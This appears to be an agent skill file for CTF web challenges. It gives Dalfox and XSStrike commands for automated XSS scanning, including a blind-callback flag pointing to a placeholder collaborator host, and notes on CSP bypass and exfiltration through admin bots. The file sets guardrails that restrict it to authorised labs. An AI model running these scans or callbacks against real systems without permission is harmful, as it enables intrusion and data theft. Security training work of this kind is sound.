---
name: xss-automation
description: "- [XSS Automation with Dalfox and XSStrike](#xss-automation-with-dalfox-and-xsstrike)"
license: MIT
compatibility: Requires filesystem-based agent (Hermes compatible)
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

<!-- Original file: ctf-web/xss-automation/SKILL.md -->

# Procedimiento

Sigue los pasos y referencias del contenido base de esta habilidad.

## Guardrails de seguridad

- Ejecuta comandos de este skill solo en entornos autorizados (CTF/lab/sandbox).
- No reutilices payloads ni comandos contra infraestructura real sin permiso explicito.
- Usa payloads de verificacion no destructivos primero.

## Contenido base

# CTF Web - XSS Automation Tooling

## XSS Automation with Dalfox and XSStrike

### Prerequisites

**Go tools:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Python tools:**
```bash
pip install xsstrike
```

### Quick Commands

```bash
# dalfox: parametro unico
dalfox url "https://target/search?q=test"

# dalfox: pipe from discovered urls
cat urls.txt | dalfox pipe

# dalfox: usar blind callback
dalfox url "https://target/search?q=test" -b https://<collaborator>

# xsstrike: analisis de reflejo y payload fitting
xsstrike -u "https://target/search?q=test"
```

### Practical Notes

- Prioriza sinks reales (innerHTML, document.write, template rendering, eval-like).
- Combina con client-side y client-side-advanced para bypass de CSP/filtros.
- Si solo ejecuta en admin bot, pivot a cadenas de bot abuse y exfiltracion minima.
